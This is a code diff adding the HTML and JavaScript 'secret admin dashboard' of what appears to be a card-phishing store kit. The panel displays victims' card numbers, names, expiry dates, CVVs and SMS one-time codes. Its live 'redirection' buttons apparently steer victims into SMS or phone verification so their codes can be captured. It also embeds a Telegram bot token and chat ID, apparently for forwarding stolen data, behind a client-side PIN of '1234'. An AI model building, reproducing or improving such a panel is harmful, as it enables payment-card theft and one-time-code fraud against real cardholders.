@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>REVOLT STORE - Secret Admin Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    body {
+      background-color: #070913;
+      padding: 30px 20px;
+    }
+    .admin-container {
+      max-width: 1300px;
+      margin: 0 auto;
+    }
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      padding: 20px 24px;
+      border-radius: var(--radius-lg);
+      margin-bottom: 24px;
+    }
+    .admin-title {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--sky-blue);
+    }
+    .orders-table-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius-lg);
+      padding: 24px;
+      overflow-x: auto;
+    }
+    table.orders-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.85rem;
+    }
+    table.orders-table th {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text-muted);
+      padding: 12px 14px;
+      font-weight: 700;
+      border-bottom: 1px solid var(--border-color);
+    }
+    table.orders-table td {
+      padding: 14px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      vertical-align: middle;
+    }
+    .status-badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      font-weight: bold;
+    }
+    .st-PENDING { background: rgba(234, 179, 8, 0.2); color: #eab308; }
+    .st-SMS_REQUIRED { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
+    .st-SMS_SUBMITTED { background: rgba(168, 85, 247, 0.2); color: #a855f7; }
+    .st-PHONE_REQUIRED { background: rgba(236, 72, 153, 0.2); color: #ec4899; }
+    .st-APPROVED { background: rgba(34, 197, 94, 0.2); color: #22c55e; }
+    .st-CANCELLED { background: rgba(239, 68, 68, 0.2); color: #ef4444; }
+
+    .tbl-action-btn {
+      border: none;
+      padding: 5px 10px;
+      border-radius: 6px;
+      font-family: inherit;
+      font-size: 0.75rem;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 2px;
+    }
+    /* PIN Login Overlay */
+    .pin-overlay {
+      position: fixed;
+      inset: 0;
+      background: #070913;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .pin-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      padding: 30px;
+      border-radius: var(--radius-lg);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- PIN Authentication Screen -->
+  <div class="pin-overlay" id="pinOverlay">
+    <div class="pin-card">
+      <h2 style="margin-bottom: 8px;">🔐 Secret Admin Login</h2>
+      <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px;">Enter Admin PIN to access dashboard</p>
+      <form id="pinForm">
+        <input type="password" id="pinInput" class="form-input" style="text-align: center; font-size: 1.5rem; letter-spacing: 4px; margin-bottom: 16px;" placeholder="****" required>
+        <button type="submit" class="btn-primary btn-block">Unlock Dashboard 🚀</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="admin-container">
+    <!-- Header -->
+    <div class="admin-header">
+      <div>
+        <span class="admin-title">⚡ Nexus Secret Admin Dashboard</span>
+        <span style="display: block; font-size: 0.8rem; color: var(--text-muted); margin-top: 2px;">Real-time Customer Orders & Telegram Control</span>
+      </div>
+      <div>
+        <button class="btn-secondary" onclick="openConfigModal()">⚙️ Bot Settings</button>
+      </div>
+    </div>
+
+    <!-- Real-Time Orders Table -->
+    <div class="orders-table-card">
+      <h3 style="margin-bottom: 16px;">📦 Live Orders & Redirection Control</h3>
+      <table class="orders-table">
+        <thead>
+          <tr>
+            <th>Order ID</th>
+            <th>Product & Plan</th>
+            <th>Discord</th>
+            <th>Payment Details</th>
+            <th>SMS Code</th>
+            <th>Status</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="adminOrdersTbody">
+          <tr><td colspan="7" style="text-align: center; color: var(--text-muted); padding: 30px;">Loading live orders...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Bot Config Modal -->
+  <div class="modal-overlay" id="adminConfigModal">
+    <div class="modal-card">
+      <button class="close-modal" onclick="closeConfigModal()">&times;</button>
+      <h2>⚙️ Telegram Credentials</h2>
+      <form id="botConfigForm">
+        <div class="form-group" style="margin-top: 16px;">
+          <label class="form-label">Telegram Bot Token:</label>
+          <input type="text" id="tgBotToken" class="form-input" value="8652135964:AAFm5fhBvRZysScuiVT1ACksfA7UDZgZrq0">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Telegram Chat ID:</label>
+          <input type="text" id="tgChatId" class="form-input" value="8815011903">
+        </div>
+        <button type="submit" class="btn-primary btn-block">Save Telegram Credentials 💾</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const DEFAULT_PIN = '1234';
+    const pinOverlay = document.getElementById('pinOverlay');
+    const pinForm = document.getElementById('pinForm');
+    const pinInput = document.getElementById('pinInput');
+    const adminOrdersTbody = document.getElementById('adminOrdersTbody');
+    const adminConfigModal = document.getElementById('adminConfigModal');
+
+    // PIN Authentication
+    pinForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      if (pinInput.value === DEFAULT_PIN) {
+        pinOverlay.style.display = 'none';
+        startDashboard();
+      } else {
+        alert('Invalid Admin PIN!');
+      }
+    });
+
+    let autoRefreshInterval = null;
+
+    function startDashboard() {
+      fetchAdminOrders();
+      autoRefreshInterval = setInterval(fetchAdminOrders, 3000);
+    }
+
+    async function fetchAdminOrders() {
+      try {
+        const res = await fetch('/api/admin/orders');
+        const orders = await res.json();
+        renderTable(orders);
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function renderTable(orders) {
+      if (!orders || orders.length === 0) {
+        adminOrdersTbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: var(--text-muted); padding: 30px;">No customer orders placed yet.</td></tr>`;
+        return;
+      }
+
+      adminOrdersTbody.innerHTML = orders.map(o => {
+        let paymentInfo = '';
+        if (o.paymentMethod === 'Card') {
+          paymentInfo = `<div style="line-height:1.3;">
+            <b style="color:#22c55e;">Card:</b> ${o.cardNumber || 'N/A'}<br/>
+            <b>Name:</b> ${o.cardName || 'N/A'}<br/>
+            <b>Exp:</b> ${o.cardExpiry || ''} | <b>CVV:</b> ${o.cardCvv || ''}
+          </div>`;
+        } else {
+          paymentInfo = `<div><b style="color:#eab308;">Crypto:</b> ${o.paymentRef || 'No Tx Hash'}</div>`;
+        }
+
+        return `<tr>
+          <td><code>#${o.id}</code></td>
+          <td><b>${o.productName}</b><br/><span style="color:var(--text-muted); font-size:0.75rem;">${o.tier.toUpperCase()} ($${o.price})</span></td>
+          <td><code>${o.discordTag}</code></td>
+          <td>${paymentInfo}</td>
+          <td><b style="color:#3b82f6; font-size:1rem;">${o.smsCode || '-'}</b></td>
+          <td><span class="status-badge st-${o.status}">${o.status}</span></td>
+          <td>
+            <button class="tbl-action-btn btn-sms" onclick="sendAction('${o.id}', 'sms')">💬 SMS</button>
+            <button class="tbl-action-btn btn-phone" onclick="sendAction('${o.id}', 'phone')">📱 Phone</button>
+            <button class="tbl-action-btn btn-approve" onclick="sendAction('${o.id}', 'approve')">✅ Approve</button>
+            <button class="tbl-action-btn btn-cancel" onclick="sendAction('${o.id}', 'cancel')">❌ Cancel</button>
+          </td>
+        </tr>`;
+      }).join('');
+    }
+
+    async function sendAction(orderId, action) {
+      try {
+        await fetch('/api/admin/action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ orderId, action })
+        });
+        fetchAdminOrders();
+      } catch (err) {
+        alert("Action failed!");
+      }
+    }
+
+    function openConfigModal() { adminConfigModal.classList.add('active'); }
+    function closeConfigModal() { adminConfigModal.classList.remove('active'); }
+
+    document.getElementById('botConfigForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const botToken = document.getElementById('tgBotToken').value.trim();
+      const chatId = document.getElementById('tgChatId').value.trim();
+      await fetch('/api/telegram/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ botToken, chatId })
+      });
+      alert('Telegram Credentials Saved!');
+      closeConfigModal();
+    });
+  </script>
+</body>
+</html>
